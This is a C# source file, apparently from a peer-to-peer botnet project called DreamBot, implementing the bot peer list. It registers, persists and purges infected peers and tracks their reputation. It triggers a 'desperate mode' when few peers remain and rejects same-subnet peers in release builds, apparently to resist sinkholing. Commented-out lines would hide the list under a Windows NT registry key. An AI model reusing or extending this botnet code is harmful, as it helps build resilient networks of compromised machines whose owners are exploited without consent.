using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using DreamBot.Debugging;
using DreamBot.Utils;
using DreamBot.Workers;

namespace DreamBot.Network.Protocol.Peers
{
    public class PeerList : IEnumerable<PeerInfo>
    {
        private readonly IWorkScheduler _worker;
        private readonly Dictionary<BotIdentifier, PeerInfo> _peers;
        private static readonly Log Logger = new Log(new TraceSource("List-Manager", SourceLevels.Verbose));

        public EventHandler<BrokenBotDetectedEventArgs> BrokenBotDetected;
        public EventHandler<DesparateModeActivatedEventArgs> DesparadoModeActivated;
  
        public PeerList(IWorkScheduler worker)
        {
            _worker = worker;
            _peers = new Dictionary<BotIdentifier, PeerInfo>();
            Load();

            _worker.QueueForever(Check, TimeSpan.FromMinutes(5));
            _worker.QueueForever(Purge, TimeSpan.FromSeconds(15));
            _worker.QueueForever(Save, TimeSpan.FromMinutes(1));
        }

        private void Check()
        {
            Logger.Info("Checking peer list");
            if (!IsCritical) return;

            var bots = new List<PeerInfo>(_peers.Values).ConvertAll(pi => pi.BotId).ToArray();
            Events.Raise(DesparadoModeActivated, this, new DesparateModeActivatedEventArgs(bots));
        }

        public bool IsCritical
        {
            get { return _peers.Count <= 25;  }
        }

        internal bool TryRegister(PeerInfo peerInfo)
        {
            var endpoint = peerInfo.EndPoint;
            var ip = endpoint.Address;
            var botId = peerInfo.BotId;

            if (botId.Equals(BotIdentifier.Id))
            {
                Logger.Verbose("failed attempt for auto-adding");
                return false;
            }

            if (endpoint.Port <= 30000 || endpoint.Port >= 50000)
            {
                Logger.Verbose("failed out-of-range port number ({0}). ", endpoint.Port);
                return false;
            }
#if !DEBUG
            var ipMask = IPAddress.Parse("255.255.240.0");
            foreach (var info in _peers.Values)
            {
                var inSameSubnet = IPAddressUtils.IsInSameSubnet(ip, info.EndPoint.Address, ipMask);
                if(inSameSubnet)
                {
                    return false;
                }
            }
#endif
            if (_peers.ContainsKey(peerInfo.BotId))
            {
                Logger.Verbose("bot with same ID already exists. Touching it.");
                var peer = _peers[botId];
                peer.EndPoint = endpoint;
                peer.Touch();
                return false;
            }

            if (_peers.Count >= 256)
            {
                Purge();
            }

            _peers.Add(botId, peerInfo);
            Logger.Verbose("{0} added", peerInfo);
            return true;
        }

        public List<PeerInfo> GetPeersEndPoint()
        {
            return Recent();
        }

        public void UpdatePeer(BotIdentifier botId)
        {
            if (_peers.ContainsKey(botId))
            {
                _peers[botId].Touch();
            }
        }

        public void Punish(BotIdentifier botId)
        {
            if (_peers.ContainsKey(botId))
            {
                _peers[botId].DecreseReputation();
            }
        }

        public void Save()
        {
            var sb = new StringBuilder();
            foreach (var peerInfo in _peers.Values)
            {
                sb.AppendLine(peerInfo.ToString());
            }
            var list = sb.ToString();
            File.WriteAllText("peerlist_"+ BotIdentifier.Id + ".txt", list);
            //RegistryUtils.Write(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\list", list); 
        }

        public void Load()
        {
            //var text = RegistryUtils.Read(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\list");
            //var lines = text.Split(new[] {';'}, StringSplitOptions.RemoveEmptyEntries);
            try
            {
                var lines = File.ReadAllLines("peerlist_" + BotIdentifier.Id + ".txt");

                foreach (var line in lines)
                {
                    TryRegister(PeerInfo.Parse(line));
                }
            }
            catch (FileNotFoundException)
            {
                // ignored
            }
        }

        public void Purge()
        {
            var peersInfo = new List<PeerInfo>(_peers.Values);
            foreach (var peerInfo in peersInfo)
            {
                if (peerInfo.IsUnknownBot)
                {
                    Events.Raise(BrokenBotDetected, this, new BrokenBotDetectedEventArgs(peerInfo));
                }

                if (peerInfo.IsLazyBot || peerInfo.IsUnknownBot)
                {
                    _peers.Remove(peerInfo.BotId);
                }
            }
        }

        public List<PeerInfo> Recent()
        {
            var sortedBy = SortedPeers();
            return sortedBy.GetRange(0, Math.Min((int) 8, (int) sortedBy.Count));
        }

        private List<PeerInfo> SortedPeers()
        {
            var all = new List<PeerInfo>(_peers.Values);
            all.Sort((s1, s2) => (int)(s1.LastSeen - s2.LastSeen).TotalSeconds);
            return all;
        }

        [Conditional("DEBUG")]
        internal void Dump()
        {
            Dumper.Dump(_peers.Values, new[] {
                new Column<PeerInfo> { Title = "Bot ID", Width = -54, m= info => info.ToString() }, 
                new Column<PeerInfo> { Title = "Seen",   Width = -26, m = info => info.LastSeen.ToLocalTime() }, 
                new Column<PeerInfo> { Title = "Rep",    Width =   4, m = info => info.Reputation } 
            });
        }

        public IEnumerator<PeerInfo> GetEnumerator()
        {
            return _peers.Values.GetEnumerator();
        }

        IEnumerator IEnumerable.GetEnumerator()
        {
            return GetEnumerator();
        }

        internal bool IsRegisteredBot(BotIdentifier botId)
        {
            return _peers.ContainsKey(botId);
        }

        public PeerInfo this[BotIdentifier botId]
        {
            get { return _peers[botId]; }
        }

        public bool TryGet(IPEndPoint endpoint, out PeerInfo peerInfo)
        {
            foreach (var pi in _peers.Values)
            {
                if (Equals(pi.EndPoint, endpoint))
                {
                    peerInfo = pi;
                    return true;
                }
            }
            peerInfo = null;
            return false;
        }
    }

    public class BrokenBotDetectedEventArgs : EventArgs
    {
        private readonly PeerInfo _peerInfo;

        public BrokenBotDetectedEventArgs(PeerInfo peerInfo)
        {
            _peerInfo = peerInfo;
        }

        public PeerInfo PeerInfo
        {
            get { return _peerInfo; }
        }
    }
}